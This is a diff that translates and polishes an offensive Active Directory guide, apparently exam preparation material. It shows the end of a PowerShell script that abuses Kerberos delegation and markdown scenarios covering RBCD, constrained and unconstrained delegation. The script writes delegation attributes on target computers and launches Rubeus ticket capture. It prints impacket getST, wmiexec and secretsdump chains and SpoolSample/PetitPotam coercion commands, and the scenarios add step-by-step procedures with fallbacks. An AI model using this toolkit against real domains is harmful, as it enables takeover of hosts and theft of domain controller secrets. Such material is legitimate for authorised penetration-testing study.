-        Write-Output "② What is written is the complete DN of the computer object, not the container (the DN above is printed)"
-        Write-Output "③ If the attribute already has a value, clear it with -Mode RBCD-Rollback before writing it."
+        Write-Output ("  [!] Write failed : " + $_.Exception.Message)
+        Write-Output "      Checks: 1) does the current identity have GenericWrite/GenericAll on $dn"
+        Write-Output "            2) you wrote the full DN of the computer object, not a container (the DN is printed above)"
+        Write-Output "            3) if the attribute already has a value, clear it with -Mode RBCD-Rollback first"
         return
     }
 
     Write-Output ""
-    Write-Output "--- Follow-up commands on the attack aircraft (Kali) side, replace the placeholders and execute them ---"
-    Write-Output "impacket-getTGT -dc-ip TARGET 'DOMAIN/$FakeSam:<fake machine password>'"
+    Write-Output "  --- attack machine (Kali) follow-up commands; replace the placeholders then run ---"
+    Write-Output "  impacket-getTGT -dc-ip TARGET 'DOMAIN/$FakeSam:<fake machine password>'"
     Write-Output "  export KRB5CCNAME=$($FakeSam.TrimEnd('$')).ccache"
     Write-Output "  impacket-getST -spn 'cifs/TARGET.corp.local' -impersonate $script:ImpersonateUser \"
-    Write-Output "-dc-ip TARGET 'DOMAIN/$FakeSam:<fake machine password>'"
+    Write-Output "      -dc-ip TARGET 'DOMAIN/$FakeSam:<fake machine password>'"
     Write-Output "  export KRB5CCNAME=$($script:ImpersonateUser).ccache"
     Write-Output "  impacket-wmiexec -k -no-pass DOMAIN/$script:ImpersonateUser@TARGET.corp.local"
 }
@@ -1301,20 +1301,20 @@ function Set-M12dRbcd {
 function Clear-M12dRbcd {
     param([Parameter(Mandatory = $true)][string]$ComputerName)
     $dn = Get-M12dComputerDn $ComputerName
-    Write-M12dHead "Rollback RBCD: $ComputerName"
+    Write-M12dHead "Rolling back RBCD: $ComputerName"
     $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dn")
     try {
         $de.Properties['msds-allowedtoactonbehalfofotheridentity'].Clear()
         $de.CommitChanges()
-        Write-Output "[+] The attributes have been cleared and the target machine has returned to the untaken state (exam review points)."
+        Write-Output "  [+] Attribute cleared; the target machine is back to its un-taken-over state (an exam re-check point)."
     } catch {
-        Write-Output ("[!] Rollback failed:" + $_.Exception.Message)
-        Write-Output "Confirm that the current identity has write permission for the object; or use -Mode RBCD to check the status and handle it manually."
+        Write-Output ("  [!] Rollback failed : " + $_.Exception.Message)
+        Write-Output "      Confirm the current identity has write access to the object; or inspect the state with -Mode RBCD and fix it by hand."
     }
 }
 
 # ---------------------------------------------------------------------------
-# Constrained Delegation: Enumerations + S4U Command Templates
+# Constrained delegation: enumeration + S4U command templates
 # ---------------------------------------------------------------------------
 function Get-M12dConstrained {
     param([Parameter(Mandatory = $true)][string]$Account)
@@ -1327,50 +1327,50 @@ function Get-M12dConstrained {
     [void]$s.PropertiesToLoad.Add('distinguishedName')
     $r = $s.FindOne()
     Write-M12dHead "Constrained delegation configuration: $Account"
-    if (-not $r) { Write-Output "Account $Account not found"; return }
+    if (-not $r) { Write-Output "  Account $Account not found"; return }
     $uacRaw = 0
     if ($r.Properties.Contains('userAccountControl')) { $uacRaw = [Convert]::ToInt32($r.Properties['userAccountControl'][0]) }
     $trans = ($uacRaw -band 0x100000) -ne 0
     Write-Output ("  DN                        : " + $r.Properties['distinguishedName'][0])
     Write-Output ("  SPN                       : " + (@($r.Properties['servicePrincipalName']) -join ' | '))
-    Write-Output ("  TrustedToAuthForDelegation: " + $trans + "(True=supports protocol conversion, S4U2Self does not require the password of the simulated person)")
+    Write-Output ("  TrustedToAuthForDelegation: " + $trans + "  (True = protocol transition supported, S4U2Self does not need the impersonated user's password)")
     $targets = @($r.Properties['msDS-AllowedToDelegateTo'])
-    if ($targets.Count -eq 0) { Write-Output "msDS-AllowedToDelegateTo: (empty, not a constrained delegation account)"; return }
-    Write-Output "SPNs to which you can delegate:"
+    if ($targets.Count -eq 0) { Write-Output "  msDS-AllowedToDelegateTo  : (empty, this is not a constrained delegation account)"; return }
+    Write-Output "  SPNs it can delegate to:"
     foreach ($t in $targets) { Write-Output ("    - " + $t) }
-    Write-Output "Note: The delegation list only has these SPNs, tickets cannot be used on other machines/service classes."
+    Write-Output "  Note: the delegation list contains only these SPNs; the ticket cannot be used against another machine or service class."
 }
 
 function Show-M12dS4uCommands {
     param([string]$Account, [string]$TargetSpn)
     if (-not $TargetSpn) { $TargetSpn = 'cifs/TARGET.corp.local' }
-    Write-M12dHead "S4U2Self + S4U2Proxy command template (replacement placeholder)"
-    Write-Output "[A] There is protocol conversion (TrustedToAuthForDelegation, the most common) - no password of the person being imitated is required"
-    Write-Output "Windows (Rubeus, will write the ticket directly into memory /ptt):"
+    Write-M12dHead "S4U2Self + S4U2Proxy command templates (replace the placeholders)"
+    Write-Output "[A] With protocol transition (TrustedToAuthForDelegation, the common case) - no password for the impersonated user needed"
+    Write-Output "  Windows (Rubeus; injects the ticket straight into memory with /ptt):"
     Write-Output ("    .\\Rubeus.exe s4u /user:$Account /password:PASS /impersonateuser:$script:ImpersonateUser \")
     Write-Output ("        /msdsspn:$TargetSpn /ptt")
     Write-Output "    .\\Rubeus.exe s4u /user:$Account /rc4:NTHASH /impersonateuser:$script:ImpersonateUser \"
     Write-Output ("        /msdsspn:$TargetSpn /ptt")
-    Write-Output "  Linux（impacket）："
+    Write-Output "  Linux (impacket):"
     Write-Output ("    impacket-getST -spn '$TargetSpn' -impersonate $script:ImpersonateUser \\")
     Write-Output ("        -dc-ip TARGET 'DOMAIN/$Account:PASS'")
     Write-Output ("    export KRB5CCNAME=$script:ImpersonateUser.ccache")
     Write-Output ("    impacket-wmiexec -k -no-pass DOMAIN/$script:ImpersonateUser@TARGET")
     Write-Output ""
-    Write-Output "[B] No protocol conversion - must hold the simulated user's own credentials, and can only use S4U2Proxy"
+    Write-Output "[B] Without protocol transition - you must hold the impersonated user's own credentials, and only S4U2Proxy works"
     Write-Output ("    impacket-getST -spn '$TargetSpn' -impersonate $script:ImpersonateUser \\")
     Write-Output ("        -hashes :NTHASH -dc-ip TARGET 'DOMAIN/$Account:PASS'")
-    Write-Output "When DC forces AES, add /aes256:<AES key of the simulated user> to Rubeus;"
-    Write-Output "The simulated person's NTHASH cannot be used with S4U2Self, only with S4U2Proxy."
+    Write-Output "  When the DC enforces AES, add /aes256:<impersonated user's AES key> to Rubeus;"
+    Write-Output "  the impersonated user's NTHASH cannot be used for S4U2Self, only for S4U2Proxy."
     Write-Output ""
-    Write-Output "[C] Verification method when there are only service classes such as http/ in the delegation list:"
-    Write-Output "curl --negotiate -u : http://TARGET/ (SPN is http/TARGET)"
-    Write-Output "evil-winrm -i TARGET -r DOMAIN (SPN is wsman/TARGET)"
+    Write-Output "[C] How to validate when the delegation list only holds a service class such as http/:"
+    Write-Output "    curl --negotiate -u : http://TARGET/      (SPN is http/TARGET)"
+    Write-Output "    evil-winrm -i TARGET -r DOMAIN             (SPN is wsman/TARGET)"
 
     if ($Execute -and (Test-Path (Join-Path $script:ToolDir 'Rubeus.exe'))) {
         Write-Output ""
-        Write-Output "(-Execute is given and there is Rubeus.exe under -ToolDir)"
-        Write-Output "The script does not save the password: Please fill in PASS manually in the following line and then execute it (the script will not run it automatically)"
+        Write-Output "  (-Execute was given and Rubeus.exe exists under -ToolDir)"
+        Write-Output "    The script does not store passwords: fill PASS into the line below by hand and run it (the script will not run it for you)"
         Write-Output ("    & (Join-Path '$script:ToolDir' 'Rubeus.exe') s4u /user:$Account /password:PASS /impersonateuser:$script:ImpersonateUser /msdsspn:$TargetSpn /ptt")
     }
 }
@@ -1379,12 +1379,12 @@ function Show-M12dS4uCommands {
 # Unconstrained delegation: pre-exploitation checks + monitor/trigger commands
 # ---------------------------------------------------------------------------
 function Get-M12dUnconstrained {
-    Write-M12dHead "Unconstrained delegation pre-exploitation check (scenario 50)"
+    Write-M12dHead "Unconstrained delegation pre-flight check (scenario 50)"
     $me = $env:COMPUTERNAME
     $host1 = if ($TargetComputer) { $TargetComputer } else { $me }
-    Write-Output "Check target host: $host1"
+    Write-Output "  Host under check : $host1"
 
-    # 1) Whether the host is configured with unconstrained delegation
+    # 1) Is this host configured for unconstrained delegation
     try {
         $dn = Get-M12dComputerDn $host1
         $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dn")
@@ -1393,66 +1393,66 @@ function Get-M12dUnconstrained {
             $uac = [Convert]::ToInt32($de.Properties['userAccountControl'].Value)
         }
         if (($uac -band 0x80000) -ne 0) {
-            Write-Output "[1/4] Unconstrained delegation: Yes (UAC contains 0x80000), this machine can be used as a landing point"
+            Write-Output "  [1/4] Unconstrained delegation : yes (UAC contains 0x80000); this machine can be the landing spot"
         } else {
-            Write-Output "[1/4] Unconstrained delegation: No (UAC=$uac without 0x80000) - use m12-ad-enum-windows.ps1 instead"
-            Write-Output "-Mode Delegation Find a host that is actually equipped with unconstrained delegation and come back"
+            Write-Output "  [1/4] Unconstrained delegation : no (UAC=$uac does not contain 0x80000) - use m12-ad-enum-windows.ps1"
+            Write-Output "        -Mode Delegation to find a host that really is configured for unconstrained delegation, then come back"
         }
     } catch {
-        Write-Output ("[1/4] Failed to read computer object:" + $_.Exception.Message)
+        Write-Output ("  [1/4] Failed to read the computer object : " + $_.Exception.Message)
     }
 
-    # 2) Current identity (SYSTEM is required to capture tickets)
-    Write-Output "[2/4] Identity self-check"
+    # 2) Current identity (ticket capture needs SYSTEM)
+    Write-Output "  [2/4] Identity self-check"
     Show-M12dIdentity
 
-    # 3) Whether the print service pipeline is available (SpoolSample depends on it)
-    Write-Output "[3/4] Induced vector reachability"
+    # 3) Is the print spooler pipeline reachable (SpoolSample depends on it)
+    Write-Output "  [3/4] Trigger vector reachability"
     $spoolPath = "\\$host1\pipe\spoolss"
     if (Test-Path $spoolPath) {
-        Write-Output ("$spoolPath is accessible -> SpoolSample / printerbug is likely to be available")
+        Write-Output ("        $spoolPath reachable -> SpoolSample / printerbug is very likely to work")
     } else {
-        Write-Output ("$spoolPath is inaccessible -> The printing service is closed or blocked by a patch, change to PetitPotam(EFSRPC)/DFSCoerce")
+        Write-Output ("        $spoolPath unreachable -> the print service is off or patched; switch to PetitPotam (EFSRPC)/DFSCoerce")
     }
 
-    # 4) Are the tools in place?
-    Write-Output "[4/4] Tool check (-ToolDir $script:ToolDir)"
+    # 4) Are the tools in place
+    Write-Output "  [4/4] Tool check (-ToolDir $script:ToolDir)"
     foreach ($t in @('Rubeus.exe', 'SpoolSample.exe', 'printerbug.exe', 'PetitPotam.exe')) {
         $p = Join-Path $script:ToolDir $t
-        if (Test-Path $p) { Write-Output ("Already in place:" + $p) }
-        else { Write-Output ("Missing:" + $t + "(It’s not necessary. If you don’t have it, use equivalent tools or just use monitor passively, etc.)") }
+        if (Test-Path $p) { Write-Output ("        in place : " + $p) }
+        else { Write-Output ("        missing  : " + $t + " (not mandatory; if it is missing, use an equivalent tool or just let monitor wait passively)") }
     }
 
     Write-Output ""
-    Write-Output "--- Utilization steps (two windows; add -Execute and the script will start monitor directly when the tool is in place) ---"
-    Write-Output "Window 1 (ticket capture): .\\Rubeus.exe monitor /interval:5 /nowrap"
-    Write-Output "Window 2 (inducing DC authentication to this machine):"
-    Write-Output (".\\SpoolSample.exe DC01 $host1 (or printerbug DC01 $host1)")
-    Write-Output "Alternative induction: impacket-petitpotam -u USER@DOMAIN -p 'PASS' -dc-ip TARGET LHOST DC01.corp.local"
-    Write-Output "After getting the base64 TGT of DC01\$, return to the attack plane:"
+    Write-Output "  --- exploitation steps (two windows; with -Execute and the tools in place the script starts monitor for you) ---"
+    Write-Output "  Window 1 (capture): .\\Rubeus.exe monitor /interval:5 /nowrap"
+    Write-Output "  Window 2 (coerce the DC into authenticating to this host):"
+    Write-Output ("         .\\SpoolSample.exe DC01 $host1   (or printerbug DC01 $host1)")
+    Write-Output "  Alternative coercion: impacket-petitpotam -u USER@DOMAIN -p 'PASS' -dc-ip TARGET LHOST DC01.corp.local"
+    Write-Output "  Once you have the base64 TGT for DC01\$, go back to the attack machine:"
     Write-Output "         impacket-ticketConverter dc.txt dc.ccache"
     Write-Output "         export KRB5CCNAME=dc.ccache"
     Write-Output "         impacket-secretsdump -k -no-pass DC01.corp.local"
-    Write-Output "Verification: The subject in klist should be DC01\$; if krbtgt can be dumped, it means it is a DC machine ticket."
+    Write-Output "  Verify: the principal in klist should be DC01\$; if you can dump krbtgt, it is a DC machine ticket."
 
     if ($Execute) {
         $rubeus = Join-Path $script:ToolDir 'Rubeus.exe'
         if (Test-Path $rubeus) {
             Write-Output ""
-            Write-Output "[-Execute] Start Rubeus monitor (Ctrl-C to stop; stop when you get the ticket)..."
+            Write-Output "  [-Execute] Starting Rubeus monitor (Ctrl-C to stop; stop once you have the ticket)..."
             & $rubeus monitor /interval:5 /nowrap
         } else {
-            Write-Output "[-Execute] But $rubeus does not exist, it only prints the command without taking any action."
+            Write-Output "  [-Execute] But $rubeus does not exist, so only the command is printed and nothing is run."
         }
     }
 }
 
 # ---------------------------------------------------------------------------
-# Enum: See all three types of delegation at once
+# Enum: see all three delegation types at once
 # ---------------------------------------------------------------------------
 function Get-M12dEnumAll {
     $root = $script:Root
-    Write-M12dHead "Unconstrained delegation host (scenario 50 landing point)"
+    Write-M12dHead "Unconstrained delegation hosts (scenario 50 landing spots)"
     $s = New-Object System.DirectoryServices.DirectorySearcher
     $s.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($root)
     $s.Filter = '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
@@ -1460,7 +1460,7 @@ function Get-M12dEnumAll {
     [void]$s.PropertiesToLoad.Add('sAMAccountName'); [void]$s.PropertiesToLoad.Add('dnsHostName')
     foreach ($r in $s.FindAll()) { Write-Output ("  " + $r.Properties['sAMAccountName'][0] + "  " + $r.Properties['dnsHostName'][0]) }
 
-    Write-M12dHead "Constrained Delegated Accounts (Scenario 52)"
+    Write-M12dHead "Constrained delegation accounts (scenario 52)"
     $s2 = New-Object System.DirectoryServices.DirectorySearcher
     $s2.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($root)
     $s2.Filter = '(msDS-AllowedToDelegateTo=*)'
@@ -1470,7 +1470,7 @@ function Get-M12dEnumAll {
         Write-Output ("  " + $r.Properties['sAMAccountName'][0] + " -> " + (@($r.Properties['msDS-AllowedToDelegateTo']) -join ', '))
     }
 
-    Write-M12dHead "Computer with RBCD configured (Scenario 51: Attribute is not empty = has been written)"
+    Write-M12dHead "Computers with RBCD configured (scenario 51: a non-empty attribute means it has been written before)"
     $s3 = New-Object System.DirectoryServices.DirectorySearcher
     $s3.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($root)
     $s3.Filter = '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)'
@@ -1488,28 +1488,28 @@ function Get-M12dEnumAll {
 function Show-M12dHelp {
     Write-Output @"
 
-m12-delegation-attacks.ps1 —— RBCD / constrained delegation / Unconstrained delegation
+m12-delegation-attacks.ps1 - RBCD / constrained delegation / unconstrained delegation
 
   -Mode Enum
-      List the current status of the three types of delegation (without side effects）
+      list the current state of all three delegation types (no side effects)
   -Mode RBCD -TargetComputer TARGET -FakeAccount 'FAKE01$' [-ImpersonateUser Administrator]
-      Write the fake machine account into the target machine msDS-AllowedToActOnBehalfOfOtherIdentity，
-      And print the attack machine side getTGT/getST/wmiexec subsequent commands
+      write the fake machine account into the target machine's msDS-AllowedToActOnBehalfOfOtherIdentity,
+      and print the attack-machine follow-up commands getTGT/getST/wmiexec
   -Mode RBCD-Rollback -TargetComputer TARGET
-      Clear this attribute (must be done for the exam, otherwise the target machine will be taken over)）
+      clear that attribute (mandatory in the exam, otherwise the target machine stays taken over)
   -Mode Constrained -ServiceAccount svc_sql [-Spn 'cifs/TARGET.corp.local']
-      Check the delegation target SPN and whether it supports protocol conversion and printing S4U two sets of commands（Rubeus + impacket）
-  -Mode Unconstrained [-TargetComputer Local name] [-ToolDir C:\Tools] [-Execute]
-      Four pre-checks + Rubeus monitor / induce authentication command；-Execute Start directly monitor
+      check the delegation target SPN and whether protocol transition is supported, print both S4U command sets (Rubeus + impacket)
+  -Mode Unconstrained [-TargetComputer this host name] [-ToolDir C:\Tools] [-Execute]
+      four pre-flight checks + Rubeus monitor / induced-authentication commands; -Execute starts monitor directly
 
-  Universal：-Domain DOMAIN（Required when no domain is added or cross-domain） -ImpersonateUser USER
-        -Execute（By default, it only prints commands and does not actually call external exe）
-placeholder：DOMAIN=corp.local  TARGET=WS02  USER/PASS/NTHASH Replaced by parameters or print template。
+  Common: -Domain DOMAIN (required when not domain-joined or when crossing domains) -ImpersonateUser USER
+        -Execute (prints commands only by default; never calls the external exe)
+Placeholders: DOMAIN=corp.local  TARGET=WS02  USER/PASS/NTHASH are supplied as arguments or replaced in the printed templates.
 "@
 }
 
 # ---------------------------------------------------------------------------
-# Main process
+# Main flow
 # ---------------------------------------------------------------------------
 if ($Help) { Show-M12dHelp; return }
 
@@ -1518,7 +1518,7 @@ catch {
     Write-Output "[!] Initialization failed: $($_.Exception.Message)"
     exit 1
 }
-Write-Output "[*] Search root: $script:Root"
+Write-Output "[*] Search root : $script:Root"
 
 switch ($Mode) {
     'Enum' {
@@ -1527,7 +1527,7 @@ switch ($Mode) {
     'RBCD' {
         if (-not $TargetComputer -or -not $FakeAccount) {
             Write-Output "[!] -Mode RBCD requires -TargetComputer TARGET and -FakeAccount 'FAKE01$'"
-            Write-Output "Example: .\m12-delegation-attacks.ps1 -Mode RBCD -TargetComputer WS02 -FakeAccount 'FAKE01$'"
+            Write-Output "    e.g.: .\m12-delegation-attacks.ps1 -Mode RBCD -TargetComputer WS02 -FakeAccount 'FAKE01$'"
             Show-M12dHelp
             exit 1
         }
@@ -1543,8 +1543,8 @@ switch ($Mode) {
     }
     'Constrained' {
         if (-not $ServiceAccount) {
-            Write-Output "[!] -Mode Constrained requires -ServiceAccount service account name (such as svc_sql)"
-            Write-Output "Don’t know which account is equipped with constrained delegation? Run first -Mode Enum"
+            Write-Output "[!] -Mode Constrained requires -ServiceAccount <service account name> (e.g. svc_sql)"
+            Write-Output "    Not sure which account is configured for constrained delegation? Run -Mode Enum first"
             exit 1
         }
         Get-M12dConstrained $ServiceAccount
@@ -1557,26 +1557,26 @@ switch ($Mode) {
 }
 
 Write-Output ""
-Write-Output "[*] Tip: High-value actions related to tickets (secretsdump/ticketer) are all done on the attack machine."
-Write-Output "[*] The Windows side is only responsible for ticket capture and induction authentication; remember to roll back RBCD and clean up the tickets after completion."
+Write-Output "[*] Tip: the high-value ticket actions (secretsdump / ticketer) all happen on the attack machine,"
+Write-Output "[*]       the Windows side only captures tickets and coerces authentication; roll back RBCD and clean up tickets when done."
 ````
 
-## Scenario 51: Have relevant write permissions on the computer object, but cannot directly manage the target host (RBCD)
+## Scenario 51: Write permissions on a computer object, but no direct admin on the target host (RBCD)
 
-**Situation**: Have write permissions for the computer object of the target machine (such as WS02) (typically: GenericWrite/GenericAll or can be changed to `msDS-AllowedToActOnBehalfOfOtherIdentity`); also have a "subject that can be simulated" (you can create a self-made machine account, the default domain policy allows ordinary users to add 10 units). Goal: Access WS02 as administrator.
+**Situation**: You have write permissions on the computer object of the target machine (say WS02) — typically GenericWrite/GenericAll, or the ability to modify `msDS-AllowedToActOnBehalfOfOtherIdentity`. You also have a "principal you can impersonate" (a machine account you create yourself is enough; the default domain policy lets ordinary users add 10). Goal: reach WS02 as an administrator.
 
-**Assumptions**: The current user can add machine accounts to the domain (`MachineAccountQuota`>0, default 10); WS02's `msDS-AllowedToActOnBehalfOfOtherIdentity` is currently empty (has not been used); the target account (Administrator) is not Protected Users, and "Sensitive accounts cannot be delegated" is not checked.
+**Assumptions**: The current user can add machine accounts to the domain (`MachineAccountQuota`>0, default 10); WS02's `msDS-AllowedToActOnBehalfOfOtherIdentity` is currently empty (never abused); the target account (Administrator) is not in Protected Users and does not have "Account is sensitive and cannot be delegated" checked.
 
-**Prepare (attacker)**: impacket `addcomputer / getTGT / getST / wmiexec`; **Windows profiler** writing attribute function, see `m12-delegation-attacks.ps1 -Mode RBCD` (use .NET ADSI to write security descriptors, does not rely on the Active Directory module).
+**Prepare (attacker side)**: impacket `addcomputer / getTGT / getST / wmiexec`; on the **Windows side** the attribute-writing function is in `m12-delegation-attacks.ps1 -Mode RBCD` (writes the security descriptor with .NET ADSI, no dependency on the ActiveDirectory module).
 
-**Procedure**：
+**Procedure**:
 ```bash
-# ① Add a fake machine (note the password)
+# ① Add a fake machine (write down the password)
 impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Fake#Passw0rd' \
   -dc-ip DC01.corp.local 'CORP/USER:PASS'
-# ② Windows side: Write the SID of FAKE01$ into AllowedToActOnBehalfOfOtherIdentity of WS02
-#    See m12-delegation-attacks.ps1 -Mode RBCD -TargetComputer WS02 -FakeAccount 'FAKE01$'
-# ③ Attack machine: Ask for TGT for the fake machine, then simulate Administrator and ask for cifs/WS02 service ticket
+# ② Windows side: write the SID of FAKE01$ into AllowedToActOnBehalfOfOtherIdentity of WS02
+#    see m12-delegation-attacks.ps1 -Mode RBCD -TargetComputer WS02 -FakeAccount 'FAKE01$'
+# ③ Attacker: get a TGT for the fake machine, then impersonate Administrator and ask for a cifs/WS02 service ticket
 impacket-getTGT -dc-ip DC01.corp.local 'CORP/FAKE01$:Fake#Passw0rd'
 export KRB5CCNAME=FAKE01.ccache
 impacket-getST -spn cifs/WS02.corp.local -impersonate Administrator \
@@ -1584,87 +1584,87 @@ impacket-getST -spn cifs/WS02.corp.local -impersonate Administrator \
 export KRB5CCNAME=Administrator.ccache
 impacket-wmiexec -k -no-pass CORP/Administrator@WS02.corp.local
 ```
-**Scripts used**: `m12-delegation-attacks.ps1` (RBCD mode: check SID, write attributes, rollback).
+**Scripts used**: `m12-delegation-attacks.ps1` (RBCD mode: look up the SID, write the attribute, roll back).
 
-**Validation**: `wmiexec -k` successfully exited the shell; `klist` can see the TGS of `cifs/WS02.corp.local` and the main body is `Administrator`.
+**Validation**: `wmiexec -k` gives you a shell; `klist` shows the TGS for `cifs/WS02.corp.local` with `Administrator` as the principal.
 
-**Failure branches and alternatives**：
-- `addcomputer` Report quota/Permission error（MAQ=0）→ use you**Existing service accounts that already control passwords or hashes**（bring SPN）When pretending to be the principal, the rest of the process remains the same (it must be the account you hold the credentials for)）。
-- Property write failed → Make sure you write WS02 computer object integrity DN（not a container); use `m12-delegation-attacks.ps1` The rollback function clears the attributes and tries again.；GenericWrite If it does not mean that the property can be changed, check whether there is a looser setting on the target object. ACL（Change to a machine where you do have write permissions）。
-- `getST` newspaper KDC wrong → S4U2Self successful but S4U2Proxy Rejected, common reason: the target account is sensitive and cannot be delegated / false subject none SPN（addcomputer Will automatically register `host/FAKE01`，If you create an account manually, you need to make up for it SPN）/ The ticket has expired, please try again ①。
-- simulation Administrator rejected → Instead, impersonate another administrator (such as another member of the Domain Admin group)）。
+**Failure branches and alternatives**:
+- `addcomputer` returns a quota/permission error (MAQ=0) -> use an **existing service account whose password or hash you already control** (with an SPN) as the fake principal; the rest of the flow is unchanged (it must be an account you hold credentials for).
+- Attribute write fails -> confirm you are writing the full DN of the WS02 computer object (not a container); clear the attribute with the rollback function in `m12-delegation-attacks.ps1` and retry; if GenericWrite does not cover that attribute, check whether the target object has a looser ACL (switch to a machine where you definitely have write permissions).
+- `getST` returns a KDC error -> S4U2Self succeeded but S4U2Proxy was refused. Common causes: the target account is sensitive and cannot be delegated / the fake principal has no SPN (`addcomputer` registers `host/FAKE01` automatically, but if you create the account by hand you must add the SPN) / the ticket expired — redo step 1).
+- Impersonating Administrator is refused -> impersonate a different administrator instead (for example another member of the Domain Admins group).
 
-**Exam / OPSEC notes**: Change the delegation attribute of WS02 to **persistent traces**. After completing the task, you must roll back (the script provides rollback), otherwise points will be deducted when the target machine is taken over during review; the fake machine account can be deleted after it is used up (optional, but at least delete the ticket cache that is no longer used).
+**Exam / OPSEC notes**: Changing the delegation attribute on WS02 is a **persistent artifact**. You must roll it back when the task is done (the script provides a rollback); otherwise the target machine is left in a taken-over state and you lose points on review. The fake machine account can be deleted afterwards (optional, but at minimum delete the ticket cache you no longer use).
 
 ---
 
-## Scenario 52: The service account is controlled, constrained delegation exists, but only specified services can be accessed
+## Scenario 52: A service account is under your control with constrained delegation, but you can only reach the listed services
 
-**Situation**: Master a service account (such as `svc_sql`) configured with **Constrained Delegation (AllowedToDelegateTo)**. It can simulate any user but **can only** access the SPN specified by the delegation (such as `cifs/WS02` / `http/WS02`), and cannot access any machine.
+**Situation**: You hold a service account configured with **constrained delegation (AllowedToDelegateTo)** (say `svc_sql`). It can impersonate any user but **only** against the SPNs the delegation lists (say `cifs/WS02` / `http/WS02`) — not against an arbitrary machine.
 
-**Assumptions**: The service account credentials are valid; the delegation target SPN and host are known (see `m12-ad-enum-windows.ps1 -Mode Delegation` for enumeration); distinguish two sub-scenarios - ① `TrustedToAuthForDelegation` (protocol conversion, S4U2Self does not require the impersonator password); ② No protocol conversion → must hold the TGT/password of the impersonated user ("Constrained delegation + known user credentials" scenario, rely on `getST` `-hashes`/`-aesKey` Bring directly).
+**Assumptions**: The service account credentials are valid; you know the delegation target SPN and host (enumerate with `m12-ad-enum-windows.ps1 -Mode Delegation`); and you distinguish the two sub-cases — ① `TrustedToAuthForDelegation` (protocol transition, S4U2Self does not need the impersonated user's password); ② no protocol transition -> you must hold the impersonated user's TGT or password (the "constrained delegation + known user credentials" scenario, supplied directly to `getST` via `-hashes`/`-aesKey`).
 
-**Prepare (attacker)**: `impacket-getST`; Windows side `Rubeus s4u` template is in `m12-delegation-attacks.ps1 -Mode Constrained`.
+**Prepare (attacker side)**: `impacket-getST`; the Windows-side `Rubeus s4u` template is in `m12-delegation-attacks.ps1 -Mode Constrained`.
 
-**Procedure**：
+**Procedure**:
 ```bash
-# Protocol conversion (most common): take TGT of svc_sql → S4U2Self(Administrator) → S4U2Proxy(cifs/WS02)
+# Protocol transition (most common): take a TGT for svc_sql -> S4U2Self(Administrator) -> S4U2Proxy(cifs/WS02)
 impacket-getST -spn cifs/WS02.corp.local -impersonate Administrator \
   -dc-ip DC01.corp.local 'CORP/svc_sql:PASS'
 export KRB5CCNAME=Administrator.ccache
 impacket-wmiexec -k -no-pass CORP/Administrator@WS02.corp.local
-# Alternative: No protocol conversion → use the impersonated user’s own hash
+# Alternative: no protocol transition -> use the impersonated user's own hash
 impacket-getST -spn cifs/WS02.corp.local -impersonate Administrator \
   -hashes :NTHASH -dc-ip DC01.corp.local 'CORP/svc_sql:PASS'
 ```
-Windows side equivalence：`Rubeus.exe s4u /user:svc_sql /password:PASS /impersonateuser:Administrator /msdsspn:cifs/WS02 /ptt`（protocol conversion); given when there is no conversion Rubeus add `/aes256`（The impersonated user hash is not available for S4U2Self，Can only go S4U2Proxy）。
+Windows-side equivalent: `Rubeus.exe s4u /user:svc_sql /password:PASS /impersonateuser:Administrator /msdsspn:cifs/WS02 /ptt` (protocol transition); without transition add `/aes256` to Rubeus (the impersonated user's hash cannot be used for S4U2Self, so you can only take the S4U2Proxy path).
 
-**Scripts used**: `m12-delegation-attacks.ps1` (Constrained Delegation Two Subcase Template + Target SPN Enumeration).
+**Scripts used**: `m12-delegation-attacks.ps1` (templates for the two constrained delegation sub-cases + target SPN enumeration).
 
-**Validation**: After getting `Administrator.ccache`, `wmiexec -k` enter WS02; when only HTTP SPN is allowed, change to `curl --negotiate`/WinRM corresponding tool verification instead of SMB.
+**Validation**: once you have `Administrator.ccache`, `wmiexec -k` gets you into WS02; if only an HTTP SPN is allowed, validate with `curl --negotiate` or the matching WinRM tool instead of SMB.
 
-**Failure branches and alternatives**：
-- The delegation target is `cifs/WS02` But you want to use other services on the same host (such as `http`）→ If the delegation list is written as `cifs/WS02` Single item, service type cannot be changed; check `AllowedToDelegateTo` Does it contain `http`/`wsman`，use `-altservice` Only if the hosts are the same and the configuration allows multiple service classes。
-- simulated Administrator Not accessible (Sensitive cannot be delegated）→ Change to an administrator account that can be simulated。
-- only NTHASH No clear text password → `getST` bring `-hashes`；DC force AES-only time required `-aesKey`（Take from enumeration）。
-- The service account itself SPN need（S4U The premise is that the person being imitated is a service account identity）——svc Accounts generally come with their own SPN，If you don’t make up one first。
+**Failure branches and alternatives**:
+- The delegation target is `cifs/WS02` but you want another service on the same host (say `http`) -> if the delegation list holds only the single entry `cifs/WS02`, you cannot change the service class; check whether `AllowedToDelegateTo` also contains `http`/`wsman`, and use `-altservice` only when the host is the same and the configuration allows multiple service classes.
+- The impersonated Administrator cannot get in (sensitive and cannot be delegated) -> switch to an administrator account that can be impersonated.
+- You have only the NTHASH and no cleartext password -> pass `-hashes` to `getST`; if the DC enforces AES-only you need `-aesKey` (take it from enumeration).
+- The service account itself needs an SPN (S4U requires the impersonated identity to be a service account) — svc accounts usually ship with one; if it has none, add one first.
 
-**Exam / OPSEC notes**: Constrained delegation is only valid for **specified SPN hosts**. Do not waste time trying to use tickets on other machines; simulate objects and target services are minimized according to scenarios, and clear the ccache immediately after getting the target to avoid tickets remaining on the attack machine.
+**Exam / OPSEC notes**: Constrained delegation only works against the **hosts of the listed SPNs** — do not waste time trying to use the ticket on other machines. Keep the impersonated principal and the target service as narrow as the scenario allows, and clean up the ccache as soon as you have the target so the ticket does not linger on the attacker box.
 
 ---
 
-## Scenario 53: Mastering the high authority of the subdomain, the ultimate goal is Lingen
+## Scenario 53: You own high privileges in a child domain, but the ultimate target is the forest root
 
-**Situation**: The subdomain (`child.corp.local`) has been controlled with high permissions (including subdomain krbtgt or subdomain DA can be dumped), and the final target asset is at the forest root (`corp.local`). **It cannot be preset to be feasible**: It must first be determined whether the trust type/direction and SID filtering are effective.
